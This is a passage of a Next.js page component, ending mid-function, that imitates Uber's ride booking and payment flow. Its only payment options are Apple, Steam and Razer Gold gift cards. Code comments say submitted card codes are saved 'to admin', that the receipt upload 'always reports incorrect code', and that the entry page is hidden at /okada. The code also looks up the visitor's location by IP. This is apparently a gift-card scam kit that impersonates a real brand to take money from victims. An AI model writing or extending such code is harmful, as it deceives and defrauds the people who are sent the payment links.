import { useState, useEffect, useRef, useCallback } from 'react'
import Head from 'next/head'
import { useRouter } from 'next/router'
import { enableSingleFingerMobileZoom } from '../lib/singlefinger-zoom'
import { spawnNearbyCars, clearNearbyCars } from '../lib/nearby-cars'
import { createPickupZoomGuard } from '../lib/pickup-zoom-guard'

const RIDE_TYPES = {
  uber_x: { category: '', name: 'UberX', capacity: 4, desc: '', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/uber x.png' },
  uber_xl: { category: '', name: 'UberXL', capacity: 6, desc: 'Affordable rides for groups up to 6', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.4, icon: '/uber xl.png' },
  taxi: { category: '', name: 'Taxi', capacity: 4, desc: 'Convenient rides in local taxis', baseFare: 2.50, ratePerKm: 1.20, multiplier: 0.9, icon: '/taxi.png' },
  black: { category: '', name: 'Black', capacity: 4, desc: 'Luxury rides with professional drivers', baseFare: 5.00, ratePerKm: 2.50, multiplier: 2.0, icon: '/black.png' },
  share: { category: 'Popular', name: 'Share', capacity: 1, desc: 'One seat only', baseFare: 2.00, ratePerKm: 1.00, multiplier: 0.8, icon: '/share.png' },
  comfort: { category: 'Popular', name: 'Comfort', capacity: 4, desc: 'Newer cars with extra legroom', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.4, icon: '/comfort.png' },
  comfort_electric: { category: 'Popular', name: 'Comfort Electric', capacity: 4, desc: 'Newer electric vehicles with extra legroom', baseFare: 3.50, ratePerKm: 1.80, multiplier: 1.5, icon: '/comfort electric.png' },
  electric: { category: 'Economy', name: 'Electric', capacity: 4, desc: 'Affordable rides in electric vehicles', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/electric.png' },
  uber_pet: { category: 'Economy', name: 'Uber Pet', capacity: 4, desc: 'For you and your pet', baseFare: 3.00, ratePerKm: 1.30, multiplier: 1.1, icon: '/uberpet.png' },
  uber_xxl: { category: 'Economy', name: 'UberXXL', capacity: 6, desc: 'Rides for 6 with room for extra luggage', baseFare: 4.50, ratePerKm: 2.00, multiplier: 1.6, icon: '/uber xxl.png' },
  black_suv: { category: 'Premium', name: 'Black SUV', capacity: 6, desc: 'Luxury rides for 6 with professional drivers', baseFare: 6.00, ratePerKm: 3.00, multiplier: 2.5, icon: '/black suv.png' },
  wav: { category: 'More', name: 'WAV', capacity: 4, desc: 'Wheelchair accessible vehicles', baseFare: 2.50, ratePerKm: 1.20, multiplier: 1.0, icon: '/wav.png' },
  car_seat: { category: 'More', name: 'Car Seat', capacity: 4, desc: 'For children 5 - 65 lbs', baseFare: 3.50, ratePerKm: 1.50, multiplier: 1.2, icon: '/car seat.png' },
}

const PICKUP_PRIVACY_MAX_ZOOM = 14

const PICKUP_ETA_RANGES = {
  uber_x: [5, 12], uber_xl: [8, 18], taxi: [5, 14], black: [9, 20], share: [4, 10],
  comfort: [6, 14], comfort_electric: [7, 15], electric: [5, 12], uber_pet: [7, 14],
  uber_xxl: [10, 20], black_suv: [11, 22], wav: [12, 25], car_seat: [8, 18],
}

const PAYMENT_METHODS = [
  {
    id: 'apple',
    label: 'Pay with Apple Gift Card',
    type: 'apple-uber',
  },
  {
    id: 'steam',
    label: 'Pay with Steam Gift Card',
    type: 'steam-uber',
  },
  {
    id: 'razer',
    label: 'Pay with Razor Gold',
    type: 'razer-uber',
  },
]

const PERSON_ICON = '<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>'
const FASTER_ICON = '<svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2L3 14h7v8l11-12h-7V2z"/></svg>'
const CARD_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>'
const SHARE_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/><polyline points="16 6 12 2 8 6"/><line x1="12" y1="2" x2="12" y2="15"/></svg>'
const GPS_PIN_ICON = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>'
const CITY_PIN_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>'
const BACK_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>'
const COPY_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>'
const WHATSAPP_ICON = '<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413z"/></svg>'
const SMS_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10z"></path></svg>'
const NATIVE_ICON = '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>'
const UPLOAD_ICON = '<svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>'
const RESET_VIEW_ICON = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>'

const SUGGESTED_AMOUNTS = [5, 10, 15, 20, 50]

function formatPrice(price) {
  return `$${Number(price).toFixed(2)}`
}

function calculatePrice(distanceKm, type) {
  const rideType = RIDE_TYPES[type] || RIDE_TYPES.uber_x
  const distanceFare = distanceKm * rideType.ratePerKm
  const price = Math.round((rideType.baseFare + distanceFare) * 100) / 100
  return { price, baseFare: rideType.baseFare, distanceFare: Math.round(distanceFare * 100) / 100 }
}

function getAllPrices(distanceKm) {
  return Object.entries(RIDE_TYPES).map(([key, type]) => ({
    key,
    ...type,
    ...calculatePrice(distanceKm, key),
  }))
}

function resizeImage(file, maxSize) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onerror = () => reject(new Error('read failed'))
    reader.onload = (e) => {
      const img = new Image()
      img.onerror = () => reject(new Error('decode failed'))
      img.onload = () => {
        const scale = Math.min(1, maxSize / Math.max(img.width, img.height))
        const canvas = document.createElement('canvas')
        canvas.width = Math.max(1, Math.round(img.width * scale))
        canvas.height = Math.max(1, Math.round(img.height * scale))
        canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height)
        resolve(canvas.toDataURL('image/jpeg', 0.85))
      }
      img.src = e.target.result
    }
    reader.readAsDataURL(file)
  })
}

function estimatePickupEtaMinutes(rideTypeKey, pickupLat, pickupLng) {
  const [minMinutes, maxMinutes] = PICKUP_ETA_RANGES[rideTypeKey] || PICKUP_ETA_RANGES.uber_x
  const seed = `${rideTypeKey}:${(Number(pickupLat) || 0).toFixed(3)}:${(Number(pickupLng) || 0).toFixed(3)}`
  let hash = 2166136261
  for (let i = 0; i < seed.length; i += 1) {
    hash ^= seed.charCodeAt(i)
    hash = Math.imul(hash, 16777619)
  }
  const ratio = (hash >>> 0) / 4294967295
  return Math.round(minMinutes + ratio * (maxMinutes - minMinutes))
}

function truncateAddress(value, limit = 58) {
  if (!value) return ''
  return value.length > limit ? `${value.slice(0, limit - 1)}…` : value
}

function shortPlaceName(value) {
  if (!value) return ''
  const parts = value.split(',').map((p) => p.trim()).filter(Boolean)
  if (parts.length <= 2) return value
  return parts.slice(-2).join(', ')
}

export default function PayUberPage() {
  const router = useRouter()
  const sessionId = typeof router.query.id === 'string' ? router.query.id : null

  // The landing page is hidden: it only lives at /okada. Visiting /payuber
  // without a session id bounces there so the ride-search UI never leaks out.
  useEffect(() => {
    if (!sessionId && router.pathname === '/payuber') {
      router.replace('/okada')
    }
  }, [sessionId, router.pathname, router])

  // Landing state
  const [pickupInput, setPickupInput] = useState('')
  const [dropoffInput, setDropoffInput] = useState('')
  const [pickupData, setPickupData] = useState(null)
  const [dropoffData, setDropoffData] = useState(null)
  const [searching, setSearching] = useState(false)
  const [searchError, setSearchError] = useState('')
  const [mapViewActive, setMapViewActive] = useState(false)
  const [rideList, setRideList] = useState([])
  const [distanceKm, setDistanceKm] = useState(0)
  const [durationMin, setDurationMin] = useState(0)
  const [routeCoords, setRouteCoords] = useState(null)
  const [selectedType, setSelectedType] = useState('uber_x')
  const [showModal, setShowModal] = useState(false)
  const [modalBusy, setModalBusy] = useState(false)
  const [sharing, setSharing] = useState(false)
  const [shareSheetUrl, setShareSheetUrl] = useState('')
  const [copied, setCopied] = useState(false)
  // Editable ride amount (defaults to the calculated fare, with quick amounts)
  const [amountInput, setAmountInput] = useState('')
  const [amountDirty, setAmountDirty] = useState(false)
  const [toast, setToast] = useState('')
  const [activeDropdown, setActiveDropdown] = useState(null)
  const [dropdownResults, setDropdownResults] = useState([])
  const [dropdownLoading, setDropdownLoading] = useState(false)
  const [currentCity, setCurrentCity] = useState('My location')

  // Map picker state (GPS icon)
  const [mapPickerTarget, setMapPickerTarget] = useState(null)
  const [mapPickerReady, setMapPickerReady] = useState(false)
  const [mapPickerLocating, setMapPickerLocating] = useState(false)
  const [mapPickerAddress, setMapPickerAddress] = useState('')

  // Pay-mode state (shared URL)
  const [session, setSession] = useState(null)
  const [sessionLoading, setSessionLoading] = useState(false)
  const [sessionError, setSessionError] = useState('')
  const [payStep, setPayStep] = useState('summary') // summary -> methods
  const [selectedMethod, setSelectedMethod] = useState(null)
  const [expandedMethod, setExpandedMethod] = useState(null)

  // Card check state (saves to admin on submit)
  const [cardNumber, setCardNumber] = useState('')
  const [cardLoading, setCardLoading] = useState(false)
  const [cardError, setCardError] = useState('')
  const [cardResult, setCardResult] = useState(null)
  const [cardAttempt, setCardAttempt] = useState(0)
  const [deviceId, setDeviceId] = useState(null)
  const [location, setLocation] = useState('United States')

  // Receipt upload state (always reports incorrect code)
  const [showUploadStep, setShowUploadStep] = useState(false)
  const [selectedImages, setSelectedImages] = useState([])
  const [uploadProgress, setUploadProgress] = useState(false)
  const [uploadError, setUploadError] = useState(null)
  const [createdSession, setCreatedSession] = useState(false)

  // Local profile (name + photo, stored in localStorage only)
  const [profile, setProfile] = useState(null)
  const [profileMenuOpen, setProfileMenuOpen] = useState(false)
  const [profileModalOpen, setProfileModalOpen] = useState(false)
  const [profileName, setProfileName] = useState('')
  const [profileImage, setProfileImage] = useState('')
  const [profileError, setProfileError] = useState('')

  const mapRef = useRef(null)
  const leafletRef = useRef(null)
  const mapInstanceRef = useRef(null)
  const toastTimerRef = useRef(null)
  const searchDebounceRef = useRef(null)

  const mapPickerMapRef = useRef(null)
  const mapPickerInstanceRef = useRef(null)
  const mapPickerMarkerRef = useRef(null)
  const mapPickerTargetRef = useRef(null)
  const mapPickerStartRef = useRef(null)
  const pickupDataRef = useRef(null)
  const dropoffDataRef = useRef(null)
  pickupDataRef.current = pickupData
  dropoffDataRef.current = dropoffData

  // Back-button support: each open view pushes a history entry; back pops it
  const viewStackRef = useRef([])

  const pushView = (name) => {
    viewStackRef.current = [...viewStackRef.current, name]
    history.pushState({ payuberView: name }, '')
  }

  const closeView = useCallback((name) => {
    if (viewStackRef.current[viewStackRef.current.length - 1] === name) {
      history.back()
    } else {
      viewStackRef.current = viewStackRef.current.filter((v) => v !== name)
    }
  }, [])

  useEffect(() => {
    const onPop = () => {
      const stack = viewStackRef.current
      const top = stack[stack.length - 1]
      if (!top) return
      viewStackRef.current = stack.slice(0, -1)
      if (top === 'mapView') {
        setMapViewActive(false)
      } else if (top === 'modal') {
        setShowModal(false)
      } else if (top === 'share') {
        setShareSheetUrl('')
      } else if (top === 'picker') {
        mapPickerTargetRef.current = null
        mapPickerStartRef.current = null
        mapPickerMarkerRef.current = null
        setMapPickerTarget(null)
        setMapPickerReady(false)
        setMapPickerLocating(false)
      } else if (top === 'method') {
        setExpandedMethod(null)
        setSelectedMethod(null)
        setShowUploadStep(false)
      } else if (top === 'methods') {
        setPayStep('summary')
        setExpandedMethod(null)
        setShowUploadStep(false)
      }
    }
    window.addEventListener('popstate', onPop)
    return () => window.removeEventListener('popstate', onPop)
  }, [])

  useEffect(() => {
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
    try {
      fetch('https://ipapi.co/json/')
        .then((r) => r.json())
        .then((d) => {
          if (d.country_name) setLocation(d.country_name)
          if (d.city) setCurrentCity(`${d.city}, ${d.country_name || d.country_code || ''}`)
        })
        .catch(() => {})
    } catch (err) {}
  }, [])

  const showToast = useCallback((message) => {
    setToast(message)
    if (toastTimerRef.current) clearTimeout(toastTimerRef.current)
    toastTimerRef.current = setTimeout(() => setToast(''), 3000)
  }, [])

  useEffect(() => () => { if (toastTimerRef.current) clearTimeout(toastTimerRef.current) }, [])

  // Load local profile on mount
  useEffect(() => {
    try {
      const raw = localStorage.getItem('payuber_profile')
      if (raw) setProfile(JSON.parse(raw))
    } catch (err) {}
  }, [])

  // Load Leaflet on demand
  const ensureLeaflet = useCallback(async () => {
    if (leafletRef.current) return leafletRef.current
    if (typeof window === 'undefined') return null
    const L = await import('leaflet')
    leafletRef.current = L
    return L
  }, [])

  // Load session in pay mode (auto-deleted if older than 30 days)
  useEffect(() => {
    if (!sessionId) return
    let cancelled = false
    setSessionLoading(true)
    setSessionError('')
    fetch(`/api/payuber/get-session?id=${encodeURIComponent(sessionId)}`)
      .then((res) => res.json())
      .then((data) => {
        if (cancelled) return
        if (data.error) {
          setSessionError(data.error)
          return
        }
        setSession(data)
        setPayStep('summary')
        if (typeof window !== 'undefined') window.scrollTo({ top: 0, behavior: 'smooth' })
      })
      .catch(() => { if (!cancelled) setSessionError('Failed to load payment session') })
      .finally(() => { if (!cancelled) setSessionLoading(false) })
    return () => { cancelled = true }
  }, [sessionId])

  // Pay-mode back button only exists for whoever created the session (clicked Pay Now)
  useEffect(() => {
    if (!sessionId) return
    try {
      const list = JSON.parse(localStorage.getItem('payuber_created_sessions') || '[]')
      setCreatedSession(Array.isArray(list) && list.includes(sessionId))
    } catch (err) {
      setCreatedSession(false)
    }
  }, [sessionId])

  // Restore the ride search after coming back from a pay session (before Pay Now)
  useEffect(() => {
    if (sessionId || mapViewActive) return
    let restored = null
    try {
      const raw = sessionStorage.getItem('payuber_last_search')
      if (!raw) return
      restored = JSON.parse(raw)
      if (!restored || !restored.pickup) return
      setPickupData(restored.pickup)
      setDropoffData(restored.dropoff)
      setRouteCoords(restored.routeCoords || null)
      setDistanceKm(restored.distanceKm || 0)
      setDurationMin(restored.durationMin || 0)
      setRideList(restored.rideList || [])
      setSelectedType(restored.selectedType || 'uber_x')
      setMapViewActive(true)
      pushView('mapView')
    } catch (err) {} finally {
      if (restored) {
        try { sessionStorage.removeItem('payuber_last_search') } catch (err) {}
      }
    }
  }, [sessionId])

  // Draw trip map in landing ride list
  useEffect(() => {
    if (!mapViewActive || !mapRef.current) return
    const coords = routeCoords
    if (!coords || coords.length < 2) return
    let mapInstance = null
    let gestureCleanup = null
    ;(async () => {
      const L = await ensureLeaflet()
      if (!L || !mapRef.current) return
      if (mapInstanceRef.current) mapInstanceRef.current.remove()
      mapInstance = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(coords[0], 14)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      }).addTo(mapInstance)
      const pickupIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:50%;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      const dropoffIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
      L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
      L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
      const bounds = L.latLngBounds(coords)
      setTimeout(() => {
        mapInstance.invalidateSize()
        mapInstance.fitBounds(bounds, { padding: [20, 20] })
      }, 50)
      mapInstanceRef.current = mapInstance
      gestureCleanup = enableSingleFingerMobileZoom(mapInstance)
      if (mapInstanceRef.current === mapInstance) {
        spawnNearbyCars(mapInstance, coords[0][0], coords[0][1], L)
      }
    })()
    return () => {
      if (gestureCleanup) gestureCleanup()
      clearNearbyCars(mapInstanceRef.current)
      if (mapInstanceRef.current) {
        mapInstanceRef.current.remove()
        mapInstanceRef.current = null
      }
    }
  }, [mapViewActive, routeCoords, ensureLeaflet])

  // Draw trip map in pay mode (shared payment link)
  useEffect(() => {
    if (!session || !mapRef.current) return
    const coords = Array.isArray(session.routeGeometry) && session.routeGeometry.length >= 2
      ? session.routeGeometry
      : null
    if (!coords) return
    let gestureCleanup = null
    let pickupGuardCleanup = null
    let routeLine = null
    ;(async () => {
      const L = await ensureLeaflet()
      if (!L || !mapRef.current) return
      if (mapInstanceRef.current) {
        mapInstanceRef.current.remove()
        mapInstanceRef.current = null
      }
      const mapInstance = L.map(mapRef.current, { zoomControl: false, attributionControl: false }).setView(coords[0], 14)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      }).addTo(mapInstance)
      const pickupIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:50%;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      const dropoffIcon = L.divIcon({
        className: 'route-icon',
        html: '<div style="width:14px;height:14px;background:#000;border-radius:4px;display:flex;align-items:center;justify-content:center;box-shadow:0 0 0 2px rgba(255,255,255,0.96);"><div style="width:6px;height:6px;background:#fff;border-radius:2px;"></div></div>',
        iconSize: [14, 14], iconAnchor: [7, 7],
      })
      L.marker(coords[0], { icon: pickupIcon }).addTo(mapInstance)
      L.marker(coords[coords.length - 1], { icon: dropoffIcon }).addTo(mapInstance)
      routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
      const refreshRouteLine = () => {
        if (!routeLine || !mapInstance) return
        mapInstance.removeLayer(routeLine)
        routeLine = L.polyline(coords, { color: '#000000', weight: 4, opacity: 0.8 }).addTo(mapInstance)
      }
      const bounds = L.latLngBounds(coords)
      setTimeout(() => {
        mapInstance.invalidateSize()
        mapInstance.fitBounds(bounds, { padding: [20, 20], maxZoom: PICKUP_PRIVACY_MAX_ZOOM })
      }, 50)
      mapInstanceRef.current = mapInstance
      gestureCleanup = enableSingleFingerMobileZoom(mapInstance)
      if (mapInstanceRef.current === mapInstance) {
        spawnNearbyCars(mapInstance, coords[0][0], coords[0][1], L)
      }
      pickupGuardCleanup = createPickupZoomGuard(mapInstance, {
        lat: coords[0][0],
        lng: coords[0][1],
      }, { maxPickupZoom: PICKUP_PRIVACY_MAX_ZOOM, onEnforced: refreshRouteLine })
    })()
    return () => {
      if (pickupGuardCleanup) pickupGuardCleanup()
      if (gestureCleanup) gestureCleanup()
      clearNearbyCars(mapInstanceRef.current)
      if (mapInstanceRef.current) {
        mapInstanceRef.current.remove()
        mapInstanceRef.current = null
      }
    }
  }, [session, ensureLeaflet])

  async function reverseGeocode(lat, lng) {
    try {
      const params = new URLSearchParams({ format: 'jsonv2', lat: String(lat), lon: String(lng), addressdetails: '1' })
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?${params.toString()}`)
      const data = await res.json()
      if (data && data.display_name) return { lat, lng, displayName: data.display_name }
    } catch (err) {}
    return { lat, lng, displayName: `${Number(lat).toFixed(5)}, ${Number(lng).toFixed(5)}` }
  }

  async function resolveMapPickerStart(target) {
    const sourceValue = target === 'pickup' ? pickupInput : dropoffInput
    if (sourceValue && sourceValue.trim()) {
      const geocoded = await geocodeAddress(sourceValue)
      if (geocoded) return geocoded
    }
    const other = target === 'pickup' ? dropoffDataRef.current : pickupDataRef.current
    if (other) return other
    try {
      const position = await new Promise((resolve, reject) => {
        if (!navigator.geolocation) { reject(new Error('no geolocation')); return }
        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000, maximumAge: 60000 })
      })
      const resolved = await reverseGeocode(position.coords.latitude, position.coords.longitude)
      return resolved
    } catch (err) {
      return { lat: 0, lng: 0, displayName: 'Unknown location' }
    }
  }

  // Map picker (GPS icon -> opens map at my location -> tap to fill)
  useEffect(() => {
    if (!mapPickerReady || !mapPickerTarget || !mapPickerMapRef.current) return
    let cancelled = false
    let mapInstance = null
    let marker = null
    let gestureCleanup = null
    ;(async () => {
      const L = await ensureLeaflet()
      if (cancelled || !L || !mapPickerMapRef.current) return
      const target = mapPickerTargetRef.current
      const start = mapPickerStartRef.current || { lat: 0, lng: 0, displayName: 'Unknown location' }
      mapInstance = L.map(mapPickerMapRef.current, { zoomControl: false, attributionControl: false }).setView([start.lat, start.lng], 16)
      L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19, attribution: '&copy; OpenStreetMap contributors &copy; CARTO',
      }).addTo(mapInstance)
      marker = L.marker([start.lat, start.lng], {
        icon: L.divIcon({
          className: 'map-picker-pin-icon-wrapper',
          html: `<div class="map-picker-pin ${target === 'dropoff' ? 'is-dropoff' : 'is-pickup'}">
            <div class="map-picker-pin-body"><div class="map-picker-pin-center"></div></div>
            <div class="map-picker-pin-shadow"></div>
          </div>`,
          iconSize: [34, 46],
          iconAnchor: [17, 42],
          popupAnchor: [0, -32],
        }),
        draggable: true,
      }).addTo(mapInstance)

      let resolvedToken = 0
      const commitPick = (latlng) => {
        marker.setLatLng(latlng)
        const token = ++resolvedToken
        setMapPickerAddress('Looking up address...')
        reverseGeocode(latlng.lat, latlng.lng).then((resolved) => {
          if (token !== resolvedToken || !mapPickerTargetRef.current) return
          const pickerTarget = mapPickerTargetRef.current
          const resolvedLocation = resolved || { lat: latlng.lat, lng: latlng.lng, displayName: `${latlng.lat.toFixed(5)}, ${latlng.lng.toFixed(5)}` }
          if (pickerTarget === 'pickup') {
            setPickupInput(resolvedLocation.displayName)
            setPickupData(resolvedLocation)
          } else {
            setDropoffInput(resolvedLocation.displayName)
            setDropoffData(resolvedLocation)
          }
          setMapPickerAddress(resolvedLocation.displayName)
          closeMapPicker()
          showToast(pickerTarget === 'pickup' ? 'Pickup set from map' : 'Destination set from map')
          const other = pickerTarget === 'pickup' ? dropoffDataRef.current : pickupDataRef.current
          if (other) runRideSearch({ [pickerTarget]: resolvedLocation })
        })
      }

      mapInstance.on('click', (e) => commitPick(e.latlng))
      marker.on('dragend', () => {
        const latlng = marker.getLatLng()
        mapInstance.panTo(latlng, { animate: true })
        commitPick(latlng)
      })
      setMapPickerAddress(start.displayName)
      setTimeout(() => mapInstance.invalidateSize(), 50)
      mapPickerInstanceRef.current = mapInstance
      mapPickerMarkerRef.current = marker
      gestureCleanup = enableSingleFingerMobileZoom(mapInstance)
    })()
    return () => {
      cancelled = true
      if (gestureCleanup) gestureCleanup()
      if (mapPickerInstanceRef.current) {
        mapPickerInstanceRef.current.remove()
        mapPickerInstanceRef.current = null
      }
      mapPickerMarkerRef.current = null
    }
  }, [mapPickerReady, mapPickerTarget, ensureLeaflet])

  async function openMapPicker(target) {
    mapPickerTargetRef.current = target
    setMapPickerTarget(target)
    pushView('picker')
    setMapPickerLocating(true)
    setMapPickerAddress('Centering map...')
    const start = await resolveMapPickerStart(target)
    if (mapPickerTargetRef.current !== target) return
    mapPickerStartRef.current = start
    setMapPickerReady(true)
    setMapPickerLocating(false)
  }

  const closeMapPicker = useCallback(() => {
    mapPickerTargetRef.current = null
    mapPickerStartRef.current = null
    setMapPickerTarget(null)
    setMapPickerReady(false)
    setMapPickerLocating(false)
    mapPickerMarkerRef.current = null
    viewStackRef.current = viewStackRef.current.filter((v) => v !== 'picker')
  }, [])

  // Nominatim autocomplete
  const handleAutocomplete = useCallback((query, target) => {
    if (searchDebounceRef.current) clearTimeout(searchDebounceRef.current)
    if (!query || query.trim().length < 2) {
      setActiveDropdown(null)
      setDropdownResults([])
      return
    }
    searchDebounceRef.current = setTimeout(async () => {
      setDropdownLoading(true)
      setActiveDropdown(target)
      try {
        const params = new URLSearchParams({
          format: 'jsonv2', q: query.trim(), limit: '5', dedupe: '1', addressdetails: '1',
          countrycodes: 'us,gb,au,fr,de,it,es,nl,be,ch,at,pt,se,no,dk,fi,ie,pl',
        })
        const res = await fetch(`https://nominatim.openstreetmap.org/search?${params.toString()}`)
        const data = await res.json()
        setDropdownResults(Array.isArray(data) ? data.map((item) => ({
          lat: parseFloat(item.lat),
          lng: parseFloat(item.lon),
          displayName: item.display_name || '',
        })) : [])
      } catch (err) {
        setDropdownResults([])
      } finally {
        setDropdownLoading(false)
      }
    }, 350)
  }, [])

  const selectSuggestion = (target, result) => {
    if (target === 'pickup') {
      setPickupInput(result.displayName)
      setPickupData({ lat: result.lat, lng: result.lng, displayName: result.displayName })
    } else {
      setDropoffInput(result.displayName)
      setDropoffData({ lat: result.lat, lng: result.lng, displayName: result.displayName })
    }
    setActiveDropdown(null)
    setDropdownResults([])
  }

  async function geocodeAddress(query) {
    try {
      const params = new URLSearchParams({
        format: 'jsonv2', q: query.trim(), limit: '1', addressdetails: '1',
        countrycodes: 'us,gb,au,fr,de,it,es,nl,be,ch,at,pt,se,no,dk,fi,ie,pl',
      })
      const res = await fetch(`https://nominatim.openstreetmap.org/search?${params.toString()}`)
      const data = await res.json()
      if (Array.isArray(data) && data.length > 0) {
        return {
          lat: parseFloat(data[0].lat),
          lng: parseFloat(data[0].lon),
          displayName: data[0].display_name || query,
        }
      }
      return null
    } catch (err) {
      return null
    }
  }

  async function runRideSearch(preResolved = {}) {
    setSearchError('')
    const pickupText = (preResolved.pickup ? preResolved.pickup.displayName : pickupInput).trim()
    const dropoffText = (preResolved.dropoff ? preResolved.dropoff.displayName : dropoffInput).trim()
    if (!pickupText || !dropoffText) {
      showToast('Please enter both pickup and dropoff locations')
      return
    }
    setSearching(true)
    try {
      let pickup = preResolved.pickup || (pickupData && pickupData.displayName === pickupInput.trim() ? pickupData : await geocodeAddress(pickupInput))
